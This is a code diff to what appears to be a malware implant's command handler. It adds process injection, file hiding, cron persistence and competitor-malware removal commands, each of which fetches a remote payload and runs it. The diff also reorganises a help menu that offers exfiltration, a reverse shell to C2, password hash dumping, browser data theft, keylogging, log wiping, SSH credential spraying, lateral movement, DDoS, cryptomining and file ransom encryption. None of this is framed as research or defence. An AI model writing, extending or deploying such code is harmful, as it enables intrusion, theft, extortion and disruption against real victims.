@@ -385,6 +385,32 @@ def handle_trigger(cmd):
         print("[+] Checking for forensic artifacts")
         return run_payload("forensics_check.py")
     
+    # === ADVANCED PAYLOADS - NEW ADDITIONS ===
+    
+    elif cmd == "trigger_procinject":
+        """Process injection for stealth execution"""
+        fetch_payload("process_inject.py")
+        print("[+] Starting process injection module")
+        return run_payload("process_inject.py")
+    
+    elif cmd == "trigger_filehide":
+        """Advanced file hiding techniques"""
+        fetch_payload("advanced_filehider.py")
+        print("[+] Starting advanced file hiding")
+        return run_payload("advanced_filehider.py")
+    
+    elif cmd == "trigger_cronpersist":
+        """Advanced cron persistence methods"""
+        fetch_payload("advanced_cron_persistence.py")
+        print("[+] Setting up advanced cron persistence")
+        return run_payload("advanced_cron_persistence.py")
+    
+    elif cmd == "trigger_compclean":
+        """Competitor/malware cleaner"""
+        fetch_payload("competitor_cleaner.py")
+        print("[+] Starting competitor cleanup")
+        return run_payload("competitor_cleaner.py")
+    
     # === FILE ENCRYPTION PAYLOAD ===
     
     elif cmd.startswith("trigger_fileransom"):
@@ -572,40 +598,53 @@ BASIC OPERATIONS:
   trigger_exfil <path>     - Exfiltrate data from specified path
   reverse_shell           - Start reverse shell to C2
 
-PAYLOAD EXECUTION:
+RECONNAISSANCE & INTELLIGENCE:
   trigger_sysrecon        - System reconnaissance
   trigger_linpeas         - Linux privilege escalation check
   trigger_hashdump        - Password hash extraction
   trigger_browsersteal    - Browser data theft
-  trigger_keylogger       - Start keystroke logging
-  trigger_keylogger stop  - Stop keystroke logging
-  trigger_screenshot      - Start screen capture
-  trigger_screenshot stop - Stop screen capture
-  trigger_logclean        - Clean system logs
-  trigger_logclean all    - Clean all logs aggressively
-  trigger_sshspray        - SSH credential spraying
-  trigger_dnstunnel       - DNS tunneling C2
-  trigger_autodeploy      - Auto-deploy to network
+  trigger_network_scan    - Network host discovery
 
-FILE ENCRYPTION:
+ADVANCED PAYLOADS:
+  trigger_procinject      - Process injection for stealth execution
+  trigger_filehide        - Advanced file hiding techniques
+  trigger_cronpersist     - Advanced cron persistence methods
+  trigger_compclean       - Clean competitor malware/botnets
   trigger_fileransom encrypt <path> [password] - Encrypt files
   trigger_fileransom decrypt <path> <password> - Decrypt files
 
-COMPOUND OPERATIONS:
-  trigger_full_recon      - Execute full reconnaissance suite
-  trigger_clean_sweep     - Clean forensic traces and restart
-  trigger_harvest_all     - Harvest all possible data
+MONITORING & COLLECTION:
+  trigger_keylogger       - Start keystroke logging
+  trigger_keylogger stop  - Stop keylogger
+  trigger_screenshot      - Start screen capture
+  trigger_screenshot stop - Stop screenshot capture
 
-PERSISTENCE & PROPAGATION:
+PERSISTENCE & STEALTH:
   trigger_stealthinject   - Execute polyroot persistence
   trigger_persistence_setup - Set up additional persistence
   trigger_defense_evasion - Execute defense evasion techniques
+  trigger_logclean        - Clean system logs
+  trigger_logclean all    - Clean all logs aggressively
+
+LATERAL MOVEMENT:
+  trigger_sshspray        - SSH credential spraying
+  trigger_dnstunnel       - DNS tunneling C2
+  trigger_autodeploy      - Auto-deploy to network
   trigger_lateral_move    - Attempt lateral movement
 
 DDoS & CRYPTOMINING:
   trigger_ddos <target> <port> <duration> - DDoS attack
   trigger_mine            - Start cryptominer
   trigger_stopmine        - Stop cryptominer
+
+COMPOUND OPERATIONS:
+  trigger_full_recon      - Execute full reconnaissance suite
+  trigger_clean_sweep     - Clean forensic traces and restart
+  trigger_harvest_all     - Harvest all possible data
+
+UTILITIES:
+  trigger_forensics_check - Check for forensic artifacts
+  trigger_help           - Show this help message
 
 Use: load_payload <name.py> to download or run_payload <name.py> to execute
         """
